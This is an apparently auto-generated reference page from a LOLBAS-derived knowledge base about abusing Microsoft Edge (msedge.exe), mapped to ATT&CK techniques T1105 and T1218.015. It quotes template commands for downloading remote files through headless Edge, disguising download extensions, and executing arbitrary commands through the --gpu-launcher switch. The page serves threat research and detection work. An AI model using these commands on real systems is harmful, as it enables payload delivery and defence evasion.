---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Msedge.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `msedge.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Msedge.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Microsoft Edge browser

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/msedge.md)
- Source verification: [source record](../../sources/lolbas/msedge.exe.md)

## Aliases

- `Msedge.exe`
- `msedge.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: msedge.exe --headless --enable-logging --disable-gpu --dump-dom "{REMOTEURL:.base64.html}" > {PATH:.b64} |
| [T1218.015 - Electron Applications](../../attack/techniques/T1218.015-electron-applications.md) | explicit | source | Command metadata lists T1218.015: msedge.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&" |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/msedge.exe.md)

## Source Verification

[source record](../../sources/lolbas/msedge.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@mrd0x'
Person: mr.d0x
Author: mr.d0x
Commands:
- Category: Download
Command: msedge.exe {REMOTEURL:.exe.txt}
Description: Edge will launch and download the file. A 'harmless' file extension (e.g. .txt, .zip) should be appended to
```
